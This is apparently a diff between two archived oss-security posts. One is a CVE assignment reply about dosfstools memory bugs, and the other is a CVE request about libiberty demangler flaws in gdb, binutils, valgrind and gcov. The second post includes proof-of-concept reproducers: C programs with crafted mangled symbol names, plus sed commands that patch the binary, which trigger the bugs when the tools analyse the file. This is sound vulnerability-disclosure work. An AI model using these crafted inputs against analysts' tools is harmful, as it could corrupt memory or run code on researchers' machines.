@@ -1,98 +1,113 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/14/1
-Message-Id: <20160514135543.9BF946C050C@smtpvmsrv1.mitre.org>
-Date: Sat, 14 May 2016 09:55:43 -0400 (EDT)
-From: cve-assign@...re.org
-To: hanno@...eck.de
-Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Re: dosfstools / fsck.vfat: Several invalid memory accesses
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/05/3
+Message-Id: <5716C1F8-38A3-4FEF-A222-AA5BDC3298F1@gmail.com>
+Date: Thu, 5 May 2016 11:12:10 +0800
+From: Marcel Böhme <boehme.marcel@...il.com>
+To: CVE ID Requests <cve-assign@...re.org>, oss-security@...ts.openwall.com
+Cc: Bernd Schmidt <bschmidt@...hat.com>, florian@...h-krohm.de, nickc@...hat.com
+Subject: CVE Request: No Demangling During Analysis of Untrusted Binaries
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Hi all,
 
-These reports are about command-line programs that realistically
-encounter untrusted input. However,
-https://github.com/dosfstools/dosfstools/blob/master/README.md says
-"dosfstools consists of the programs mkfs.fat, fsck.fat and fatlabel
-to create, check and label file systems of the FAT family." It does
-not state that dosfstools provides a library that can be used to build
-other programs that a user may want. In particular, there does not
-seem to be a use case in which a provided program needs to remain
-running to process additional filesystems after encountering an
-invalid filesystem.
+Attack Vector 1: Security researchers using binary analysis tools, such as Valgrind, GDB, Binutils (e.g., objdump, nm, ..), Gcov, or other LibBFD-based tools on untrusted binaries are vulnerable to arbitrary code execution through several vulnerabilities in Libiberty, the GNU demangling library maintained by GCC. An attacker might modify a program binary such that it executes malicious code upon *analysis* (e.g., an analysis to identify whether the binary is malicious in the first place). 
 
+Attack Vector 2: Remote access / DoS via Online IDEs or demangling services.
 
-> https://github.com/dosfstools/dosfstools/issues/11
-> Global out of bounds read file_stat() / check_dir()
-> https://github.com/dosfstools/dosfstools/commit/2aad1c83c7d010de36afbe79c9fde22c50aa2f74
-> Git commit / fix
+Workaround: Until the patches propagate to the vulnerable tools, switch off default demangling! E.g.,
+$ echo "set demangle-style none"  >>  ~/.gdbinit
+$ echo "--demangle=no" >> ~/.valgrindrc
 
-As far as we can tell, this one is not a vulnerability in the
-above-described context. It seems to be an out-of-bounds read that
-doesn't affect the flow of control.
+Details and reproducers in the bug reports:
 
+1) Exploitable Buffer Overflow (Fixed in GCC trunk)
+https://gcc.gnu.org/bugzilla/show_bug.cgi?id=69687
 
-> https://github.com/dosfstools/dosfstools/issues/12
-> Unclear invalid memory access in get_fat()
-> https://github.com/dosfstools/dosfstools/commit/07908124838afcc99c577d1d3e84cef2dbd39cb7
-> Git commit / fix
-> 
-> that was a nasty one: FAT12 corruption when a certain FAT entry at the
-> end is changed.
-> 
-> set_fat(): Fix off-by-2 error leading to corruption in FAT12
-> 
-> If the third to last entry was written on a FAT12 filesystem with an
-> odd number of clusters, the second to last entry would be corrupted.
-> This corruption may also lead to invalid memory accesses when the
-> corrupted entry becomes out of bounds and is used later.
+2) Invalid Write due to a Use-After-Free (Fixed in GCC trunk)
+https://gcc.gnu.org/bugzilla/show_bug.cgi?id=70481
 
-Use CVE-2015-8872.
+3) Invalid Write due to Integer Overflow (Fixed in GCC trunk)
+https://gcc.gnu.org/bugzilla/show_bug.cgi?id=70492
 
+4) Write Access Violation (Fixed in GCC trunk)
+https://gcc.gnu.org/bugzilla/show_bug.cgi?id=70498
 
-> https://github.com/dosfstools/dosfstools/issues/25
-> Heap overflow in read_fat()
-> https://github.com/dosfstools/dosfstools/issues/26
-> Heap out of bounds read in get_fat()
-> https://github.com/dosfstools/dosfstools/commit/e8eff147e9da1185f9afd5b25948153a3b97cf52
-> Git commit / fix for both issues
-> 
-> it's a failure to properly catch a zero length FAT in read_fat() and
-> continuing with that and the other corrupt values
-> 
-> read_boot(): Handle excessive FAT size specifications
-> 
-> The variable used for storing the FAT size (in bytes) was an unsigned
-> int. Since the size in sectors read from the BPB was not sufficiently
-> checked, this could end up being zero after multiplying it with the
-> sector size while some offsets still stayed excessive. Ultimately it
-> would cause segfaults when accessing FAT entries for which no memory
-> was allocated.
+5) Various Stack Corruptions (Patch under Review)
+https://gcc.gnu.org/bugzilla/show_bug.cgi?id=70909
+https://gcc.gnu.org/ml/gcc-patches/2016-05/threads.html#00105
 
-Use CVE-2016-4804 (this applies to both issues/25 and issues/26, even
-though the impact in 25 is a heap-based buffer overflow with write
-access, and the impact in 26 is a heap-based buffer over-read).
+6) Write Access Violation (Patch under Review)
+https://gcc.gnu.org/bugzilla/show_bug.cgi?id=70926
+https://gcc.gnu.org/ml/gcc-patches/2016-05/threads.html#00223
 
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+These vulnerabilities have been found with a more efficient version of the AFL fuzzer.
+A recent 12h fuzzing session on the patched version did not reveal any more security critical bugs in the demangling library.
 
-iQIcBAEBCAAGBQJXNy15AAoJEHb/MwWLVhi25VEP/iMdL0X84Xo9ysSMP9D0hxZz
-1v3OtKF16jmGPpKBiC++PHoBN533jVi+K7epBhkvHC2ycKTsHHK6ImmWCguRU2C5
-w+rpoqEHMsqmiCf9M/XjutMHvgCdsFbNf4pe4dkJBt5oAK+oqThzUZ2kFK1Jvs0U
-HBDQHs9XKWIMals6N+FyF1TanIX2dUtchaky+Ba92piL3rdN95vs1/Mt1C6l+7bw
-ZUt8uqIZMNOCgr5Cq1gMvc16VFYOi8ZYWol1FBq0kFpxzjsOn8dpeJ4lxn+JKyyp
-hpAKUBPAgv+OWogtq+LsklD9qoGuaBKClrZiVL6qbr9YYA9NBabXuMqJJghGHUTy
-omKQsTOE+SuQXLLiV/gKs0bCUkWbK7yScSRUG2lEb1qtbWqHByZTq/FHTC2Kc5IY
-n0VUEayp2IFwfny11pM+D1O6VeWBFRvZNgc849VHNSo5KbTo1z9aFQSmld38t5sW
-DOzg6IvV86P+jP/OzCv7uDbJG6aSDoy8fELv4xisCp4cFq+K+9aLUqWj9HrPr+on
-3AEntSjDmvrEMvmNxY6I7ayan2AphcEGblUNnuu+2k0KnOEKjS1oIcCXSbnS8F0J
-NGI1jYf+Y5LPMX6aLmJEazyU0fXtNJx6BAKhmaGNzTBXpZdhD9nkw88puLQKMBv2
-TZGsWop91NEPNGjtPSRa
-=tWe9
------END PGP SIGNATURE-----
+POC for PR69687
+========================
+
+** GDB and BINUTILS
+$ cat comileme.c
+#include <stdio.h>
+const char *__020A___________________X00020A___R0020A__U000R03000N99999999_020A__K000="Hello World";
+int main() {
+  printf("%s\n",__020A___________________X00020A___R0020A__U000R03000N99999999_020A__K000);
+}
+$ g++ compileme.c -o compileme
+$ ./compileme
+Hello World!
+$ gdb ./compileme
+..
+$ objdump -x -C ./compileme
+..
+$ nm -C ./compileme
+..
+
+** VALGRIND + GCOV:
+$ cat compilemetoo.c
+#include<stdio.h>
+#include<stdlib.h>
+
+const char* ____________________X00020A___R0020A__U000R03000N99999999_020A__K000(){
+  char *p;
+  p = (char *) malloc(19);
+  p = (char *) malloc(12);
+  free(p);
+  p = (char *) malloc(16);
+  return "Hello World!";
+}
+
+int main()
+{
+   printf("%s\n",____________________X00020A___R0020A__U000R03000N99999999_020A__K000());
+   return 0;
+}
+
+$ g++ compilemetoo.c -o compilemetoo
+$ sed -bi s/Z68/_20/g compilemetoo
+$ chmod u+x compilemetoo
+$ ./compilemetoo
+Hello World!
+$ valgrind --leak-check=yes ./compilemetoo
+..
+
+GCOV:
+$ g++ -fprofile-arcs -ftest-coverage compilemetoo.c -o compilemetoo
+$ sed -bi s/Z68/_20/g compilemetoo
+$ sed -bi s/Z68/_20/g compilemetoo.gcda
+$ ./compilemetoo
+Hello World!
+$ gcov --version
+gcov (GCC) 7.0.0
+$ gcov -mf compilemetoo
+..
+
+Best regards,
+- Marcel
+
+---
+Marcel Böhme
+Post-doctoral Research Fellow
+TSUNAMi Security Research Center
+National University of Singapore
+
